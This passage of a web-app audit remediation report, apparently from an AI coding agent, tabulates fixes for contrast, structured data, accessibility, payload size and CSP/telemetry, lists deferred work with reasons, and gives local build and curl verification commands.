| 3 | WCAG AA contrast failures + invisible light-theme focus ring | **Fixed** | Re-tuned dark `--racing-red`/`--racing-coral`/`--primary`/`--destructive` (plus `--destructive-foreground` → dark label, matching the primary button pattern) and darkened `--accent` to 0.23; light theme `--racing-green`/`--amber`/`--cyan`/`--primary`/`--racing-coral` deepened; both focus rings are now **opaque** (dark `0.72 0.20 27`, light `0.50 0.20 25`) instead of alpha-composited. Unread badge switched to `text-racing-red-foreground`. | New `src/lib/color-contrast.test.ts` parses `globals.css` and asserts **30 pairs** ≥ 4.5:1 (text) / ≥ 3:1 (focus ring, SC 1.4.11) across every surface text can land on; it caught two near-misses during the change (values solved against the wrong surface) |
| 4 | No `AggregateRating` structured data | **Fixed** | Setup detail graph now emits `AggregateRating` (`ratingValue` = mean of the Pace/Predictability averages shown on the page, `bestRating` 5, `ratingCount`) and omits it entirely when `ratingCount` is 0 — zero-rater markup is invalid and treated as spam. | Built page includes the entity; gating logic is in `src/app/setups/[id]/page.tsx` |
| 5 | No skip link; avatar names announced twice | **Fixed** | Skip-to-content link is now the first focusable element (SR-only until focused), with `#main-content` + `tabIndex={-1}` on `<main>` so focus actually moves. All six `AvatarImage` call sites are `alt=""` (each sits beside the name as visible text). | Live HTML contains the skip link and the focus target; `src/components/avatar-alt.test.ts` scans every `.tsx` under `src/` and fails if a future avatar introduces a duplicated name |
| 6 | 313–326 KiB gzip JS/route; 500-row hydrated client index | **Reduced** | `SETUPS_BROWSE_LIMIT` 500 → **128** (worst case ~1.5 MiB → ~0.5 MiB of serialized setups) and `SETUPS_BROWSE_PAGE_SIZE` 96 → **48**. New `src/lib/payload-budget.test.ts` measures a worst-case Setup (74-field LMU `setup_values`, 400-char description, all optional fields) and asserts per-row ≤ 4 KiB, whole browse index ≤ 512 KiB, one "load older" page ≤ 200 KiB — so a new field or a limit bump now fails CI instead of silently inflating every response. | Budget test measured the real limitation: at 200 rows the payload was still 0.77 MiB, which is why the cap is 128. **Not done:** stop shipping `setupValues` in list payloads entirely (57% of each row). It requires fetching values on demand for the card's export/copy/values paths, which needs browser verification this environment cannot provide |
| 7 | No observability (no RUM, no error tracking, no CSP reporting) | **Fixed** | New `src/components/telemetry-provider.tsx` reports LCP/CLS/INP/TTFB/FCP plus `window.error` / `unhandledrejection` and page views as structured JSON to the existing log stream — no dependency, no third-party script, **no CSP change**, no cookies/ids/referrers, query strings stripped so search terms are never recorded. Error boundary routes through `reportClientError`. CSP now carries `report-uri`/`report-to` and a new bounded `/api/csp-report` route logs violations. | Live CSP header shows both directives + `Reporting-Endpoints`; `POST /api/csp-report` → 204 and the server log shows `{"level":"warn","message":"CSP violation",…"violatedDirective":"script-src"}`; 7 route tests + observer code confirmed in the client chunk |

### Deliberately not changed (and why)

- **Cacheable HTML (finding #2 of the audit's critical list).** Still every route is `private, no-store`. The fix is architectural — move the header's auth/notification needs into a client island or a `<Suspense>` boundary so anonymous HTML can be shared-cached. It is a render-model change that must be measured with field data, and doing it before RUM exists would be flying blind. Now that telemetry ships, this is the right next piece of work.
- **Indexable category pages** (`/setups/[game]`, `/setups/[game]/[track]`) — the largest organic-growth lever, but it adds routes and content decisions (title/description patterns per game) that deserve their own review rather than being bundled with defect fixes.
- **Data-layer circuit breaker / degraded-mode UI** — the 7 s failure path is untouched. The current behaviour (empty results, cached for 60 s) is at least explicit in the code; changing it without being able to reproduce the failure against a real Supabase instance risks trading one silent failure for another.
- **`setupValues` in list payloads** (see #6) and **`img-src 'self' https:`** (needs the exact avatar/Storage origins before tightening).

### Verification commands

```bash
npx tsc --noEmit && npm run lint && npx vitest run     # 218 tests
npm run build && node scripts/check-performance-budget.mjs
npx next start -H 0.0.0.0 -p 3100                      # then probe:
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:3100/setups/not-a-uuid          # 404
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:3100/setups/compare            # 200
curl -s -D - -o /dev/null http://127.0.0.1:3100/ | grep -i 'report-uri\|reporting-endpoints'
```
